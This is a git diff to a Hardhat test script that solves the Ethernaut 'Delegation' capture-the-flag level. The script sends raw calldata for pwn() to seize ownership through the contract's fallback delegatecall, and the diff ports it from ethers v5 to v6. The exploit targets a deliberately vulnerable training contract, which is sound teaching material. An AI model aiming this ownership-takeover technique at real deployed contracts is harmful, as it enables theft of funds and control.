@@ -1,5 +1,5 @@
 import { expect } from "chai";
-import { BigNumber, Contract, Signer } from "ethers";
+import { Contract, Signer, Interface } from "ethers";
 import { ethers } from "hardhat";
 import { createChallenge, submitLevel } from "./utils";
 
@@ -14,19 +14,19 @@ before(async () => {
   [eoa] = accounts;
   const challengeFactory = await ethers.getContractFactory(`Delegation`);
   const challengeAddress = await createChallenge(
-    `0x9451961b7Aea1Df57bc20CC68D72f662241b5493`
+    `0x73379d8B82Fda494ee59555f333DF7D44483fD58`
   );
   challenge = await challengeFactory.attach(challengeAddress);
 });
 
 it("solves the challenge", async function () {
   const delegateeAbi = ["function pwn()"];
-  let iface = new ethers.utils.Interface(delegateeAbi);
+  let iface = new Interface(delegateeAbi);
   const data = iface.encodeFunctionData(`pwn`, [])
 
   tx = await eoa.sendTransaction({
     from: await eoa.getAddress(),
-    to: challenge.address,
+    to: challenge.target,
     data,
     // estimating gas fails! because fallback does not revert when inner call fails
     // The catch about gas estimation is that the node will try out your tx
@@ -37,7 +37,7 @@ it("solves the challenge", async function () {
     // you can get a gas estimation that would be enough for the caller contract,
     // but not for the callee.
     // https://gist.github.com/spalladino/a349f0ca53dbb5fc3914243aaf7ea8c6
-    gasLimit: BigNumber.from(`100000`),
+    gasLimit: 100000n,
   })
 
   // tx = await challenge.fallback({
@@ -47,5 +47,5 @@ it("solves the challenge", async function () {
 });
 
 after(async () => {
-  expect(await submitLevel(challenge.address), "level not solved").to.be.true;
+  expect(await submitLevel(challenge.target), "level not solved").to.be.true;
 });
